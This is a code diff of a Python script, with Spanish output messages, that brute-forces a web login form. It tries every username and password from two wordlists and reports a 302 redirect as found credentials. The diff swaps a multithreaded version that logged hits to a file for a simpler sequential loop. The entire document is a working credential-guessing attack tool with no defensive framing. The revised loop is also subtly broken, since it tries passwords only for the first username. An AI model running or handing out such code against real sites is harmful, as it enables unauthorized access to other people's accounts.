@@ -1,43 +1,17 @@
 import requests
 import argparse
-import concurrent.futures
 
-def brute_force_login(url, users_file, passwords_file, output_file, max_workers=10):
-    with open(users_file, 'r') as users:
-        usernames = users.readlines()
-
-    with open(passwords_file, 'r') as passwords:
-        pass_list = passwords.readlines()
-
-    session = requests.Session()
-
-    def check_credentials(user, password):
-        data = {
-            'username': user.strip(),
-            'password': password.strip()
-        }
-
-        response = session.post(url, data=data, allow_redirects=False)
-
-        if response.status_code == 302:
-            result = f"[+] Credenciales encontradas: Usuario - {user}, Contraseña - {password}"
-            print(result)
-            return True, result
-        return False, None
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
-        futures = []
-        for user in usernames:
-            for password in pass_list:
-                futures.append(executor.submit(check_credentials, user, password))
-
-        for future in concurrent.futures.as_completed(futures):
-            found, result = future.result()
-            if found:
-                with open(output_file, 'a') as f:
-                    f.write(result + '\n')
-                return  
-
+def brute_force_login(url, users_file, passwords_file):
+    with open(users_file) as f_users, open(passwords_file) as f_passwords:
+        for user in f_users:
+            user = user.strip()
+            for password in f_passwords:
+                password = password.strip()
+                data = {'username': user, 'password': password}
+                response = requests.post(url, data=data, allow_redirects=False)
+                if response.status_code == 302:
+                    print(f"[+] Credenciales encontradas: Usuario - {user}, Contraseña - {password}")
+                    return
     print("[-] No se encontraron credenciales válidas")
 
 if __name__ == '__main__':
@@ -45,5 +19,6 @@ if __name__ == '__main__':
     parser.add_argument("url", help="URL del formulario de inicio de sesión")
     parser.add_argument("users_file", help="Ruta del archivo que contiene la lista de usuarios")
     parser.add_argument("passwords_file", help="Ruta del archivo que contiene la lista de contraseñas")
+    args = parser.parse_args()
 
-    brute_force_login(args.url, args.users_file, args.passwords_file, args.output_file, args.max_workers)
+    brute_force_login(args.url, args.users_file, args.passwords_file)
